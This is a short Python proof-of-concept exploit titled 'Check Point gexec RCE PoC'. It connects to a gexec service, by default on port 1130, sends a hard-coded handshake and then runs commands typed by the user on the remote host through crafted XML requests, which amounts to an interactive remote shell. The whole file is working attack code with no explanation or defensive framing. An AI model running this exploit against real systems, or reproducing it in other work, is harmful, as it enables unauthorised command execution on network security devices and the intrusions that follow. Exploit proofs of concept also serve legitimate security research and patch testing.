#!/usr/bin/env python

#  Check Point gexec PoC

import socket
import sys

print("Check Point gexec RCE PoC\n")

if len(sys.argv) < 3:
    print('gexec_poc.py <HOST> <PORT>')
    sys.exit(1)

TARGET_HOST = sys.argv[1]
TARGET_PORT = int(sys.argv[2])  # Default 1130

while True:
    cmd = input("> ")
    if not cmd:
        continue
    elif cmd == "exit":
        sys.exit(0)

    # Connect to gexec service:
    try:
        _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        _socket.settimeout(5)
        _socket.connect((TARGET_HOST, TARGET_PORT))
    except socket.error as msg:
        print("Couldn't connect to gexec: %s\nTerminating program" % msg)
        sys.exit(1)

    # Handshake
    _socket.send(b'\xf0')
    _socket.send(b'\x0c\x00\x00\x00')
    _socket.send(b'<ver>2</ver>')

    if (_socket.recv(4) != b'\x0c\x00\x00\x00') or (_socket.recv(12) != b'<ver>2</ver>'):
        print('Wrong response!')
        sys.exit(1)

    # Prepare command
    cmd = '<req><mode>finite</mode><cmd>' + cmd + '</cmd></req>'
    request = b'\x0a\x00\x00\x00<vs>1</vs>' + \
              len(cmd).to_bytes(4, 'little') + \
              cmd.encode()

    _socket.settimeout(None)
    _socket.send(request)

    while True:
        resp_size = int.from_bytes(_socket.recv(4), "little")  # Response size
        response = _socket.recv(resp_size)
        if resp_size == 0:
            break

        if response[:15] == b'<ret><vs>0</vs>':  # We are done!
            break

        print(response[22:-14].decode(), end='')
